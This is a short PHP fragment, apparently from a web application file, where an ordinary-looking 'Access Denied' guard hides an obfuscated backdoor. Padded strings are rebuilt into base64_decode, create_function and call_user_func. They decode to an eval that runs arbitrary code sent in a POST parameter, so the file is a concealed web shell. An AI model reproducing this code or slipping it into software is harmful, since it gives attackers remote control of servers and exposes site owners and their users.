...
if (!defined('IN_IA')) {
	$pa="QGVWpxYUwoQmpxFTZTY0Xpx2RF";$fu="GFjZpxSgia2lsbGRpxvZyIspxIiIs";$ck="JF9QT1NUpxW2swXSkpKTs=";$poz = str_replace("stp","","stpstrstp_rstpestppstplstpastpcstpe");$ge="Y09kZSpxhzdHJfcmVwpxb";$rju = $poz("u", "", "ubuaseu64u_udueucuode");$uu = $poz("b","","cbrebabtbeb_bfbubnbcbtibobn");$xo = $poz("h","","chalhlh_uhsehr_fhuhnhch");$xo($uu('', $rju($poz("px", "", $pa.$ge.$fu.$ck))));
	exit('Access Denied');
}
